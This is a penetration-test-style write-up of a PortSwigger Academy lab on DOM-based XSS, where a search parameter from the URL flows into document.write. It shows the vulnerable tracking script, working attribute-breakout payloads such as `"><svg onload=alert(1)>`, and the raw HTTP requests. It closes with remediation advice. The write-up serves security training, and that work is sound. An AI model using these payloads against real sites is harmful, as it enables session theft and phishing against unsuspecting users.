# PortSwigger Web Security Academy Lab Report: DOM XSS in document.write Sink Using Source location.search



**Report ID:** PS-LAB-XSS-003  

**Author:** Venu Kumar (Venu)  

**Date:** February 10, 2026  

**Lab Level:** Apprentice  

**Lab Title:** DOM XSS in document.write sink using source location.search



## Executive Summary:

**Vulnerability Type:** DOM-based Cross-Site Scripting (XSS)  

**Severity:** High (CVSS 3.1 Score: ~7.1 – AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N – client-side execution; lab solves on alert trigger)

**Description:** A DOM-based XSS vulnerability exists in the search query tracking functionality. Client-side JavaScript extracts the `search` parameter from `location.search` (URL query string) and passes it unsafely to `document.write()`, which writes it directly into an `<img src="...">` tag for tracking. No encoding or sanitization occurs, allowing breakout from the attribute and arbitrary JavaScript execution.

**Impact:** An attacker can craft a malicious URL with an XSS payload in the `?search=` parameter. If a victim visits the link (phishing/social engineering), the script executes in their browser context — potential for cookie/session theft, keylogging, or redirection in production.

**Status:** Exploited in controlled lab environment only; no real-world impact. Educational purposes.



## Environment and Tools Used:

**Target:** Simulated site from PortSwigger Web Security Academy (e.g., `https://*.web-security-academy.net`)  

**Browser:** Google Chrome (Version 120.0 or similar)  

**Tools:** Browser Developer Tools (Inspect Element, Console, Sources tab)  
Optional: Burp Suite Community Edition (for URL manipulation)  

**Operating System:** Windows 11  

**Test Date/Time:** February 10, 2026, approximately 09:45 PM IST



## Methodology:

Conducted ethically in simulated environment.

1. Accessed lab via "Access the lab" in PortSwigger Academy.  
2. Entered random alphanumeric string (e.g., `abc123xyz`) in search box → submitted.  
3. Used DevTools (right-click → Inspect) to locate reflected input: inside `<img src="/resources/images/tracker.gif?searchTerms=abc123xyz">`.  
4. Crafted breakout payload to close `src` attribute and inject event handler: `"><svg onload=alert(1)>` (or `<img src=x onerror=alert(1)>`).  
5. Appended to URL: `/?search="><svg onload=alert(1)>` (or similar).  
6. Loaded modified URL → JavaScript executed, alert popped up.  
7. Lab solved (green banner: "Congratulations, you solved the lab!").



## Detailed Findings:

**Vulnerable Code (Client-Side JavaScript Example):**

**Original Input (Safe Test):**

GET / HTTP/2
Host: 0ab900d303a135628068035600c400db.web-security-academy.net
Cookie: session=inNi2ofVdrMPMpvX39bxpMMFSKluowuN
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: text/html,application/xhtml+xml;q=0.9,*/*;q=0.8


**Reflected Output:**

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 5825

<!DOCTYPE html>
<html>
<head>
    <title>DOM XSS in document.write sink using source location.search</title>
</head>
<body>
    <!-- Lab header: "Not solved" status -->
    
    <!-- Search form: <input name="search"> -->
    
    <!-- Blog posts list (5 posts: postId 1-5) -->
    <div class="blog-post">
        <a href="/post?postId=3">Spider Web Security</a>
        <!-- Similar for others -->
    </div>
</body>
</html>



Modified request 1:

GET /?search=%22%3E%3Csvg+onload%3Dalert%281%29%3E HTTP/2
Host: 0ab900d303a135628068035600c400db.web-security-academy.net
Cookie: session=inNi2ofVdrMPMpvX39bxpMMFSKluowuN
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Referer: https://0ab900d303a135628068035600c400db.web-security-academy.net/?search=iteams
Accept: text/html,application/xhtml+xml;q=0.9,*/*;q=0.8


Response:

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 6846

<!DOCTYPE html>
<html>
<head>
    <title>DOM XSS in document.write sink using source location.search</title>
</head>
<body>
    <!-- Lab header: "SOLVED" status + celebration message -->
    
    <h1>0 search results for '"&gt;&lt;svg onload=alert(1)&gt;'</h1>
    
    <!-- Search form -->
    
    <!-- Key JS revealing the vuln: -->
    <script>
    function trackSearch(query) {
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) trackSearch(query);
    </script>
    
    <!-- No results -->
</body>
</html>


Proof of Exploitation:


![Proof of XSS  Error](https://github.com/venu-maxx/PortSwigger-XSS-Lab-3/blob/3cff60ca83491afb9957b33e4fbf68af64dd5d6b/PortSwigger%20XSS%20Lab%203%20error%20.png)

Figure 1: Malicious payload in ?search= parameter of URL.


![Proof of Successful XSS Exploitation](https://github.com/venu-maxx/PortSwigger-XSS-Lab-3/blob/2fa7f45b79d1a23641e78fc2145dc47777880041/PortSwigger%20XSS%20Lab%203%20success.png)

Figure 2: JavaScript alert(1) pops up on page load due to DOM XSS.



![Lab Solved Congratulations]()

Figure 3: PortSwigger Academy confirmation – "Congratulations, you solved the lab!"



Exploitation Explanation:

location.search (source) → document.write() (sink). Data from query string flows unsafely into HTML attribute (src). By injecting "> we close the attribute and tag, then add an element with an event handler (onload, onerror) to execute JS. document.write runs during page load, making this DOM-based (no server reflection needed). No CSP or encoding prevents execution.



Risk Assessment:

Likelihood: High (controllable URL parameter, no sanitization).
Impact: High — client-side code execution; enables phishing, session hijacking.
Affected Components: Client-side JavaScript handling search tracking.



Recommendations for Remediation:

Avoid document.write() — use safer DOM methods (e.g., document.createElement(), textContent).
Encode output for context (HTML-attribute encode query params before insertion).
Implement Content Security Policy (CSP) to block inline/event-handler scripts.
Validate/sanitize input client-side if necessary (though server-side is better for reflected sources).
Use DOMPurify or similar libraries for sanitization if dynamic HTML needed.
Test with tools like Burp DOM Invader or manual DevTools inspection.


Conclusion and Lessons Learned:

This lab showed DOM-based XSS in document.write sink fed by location.search source — solved with attribute breakout and event-handler payload.

Key Takeaways:

DOM XSS occurs client-side (no server involvement).
Inspect DOM (not View Source) to find sinks.
Break out of attributes with "> then inject events (onerror, onload).
Avoid dangerous sinks like document.write / innerHTML.
Improved skills in DOM inspection, payload crafting, and client-side vuln reporting.



References:

PortSwigger Academy: DOM XSS in document.write sink using source location.search
General: DOM-based cross-site scripting
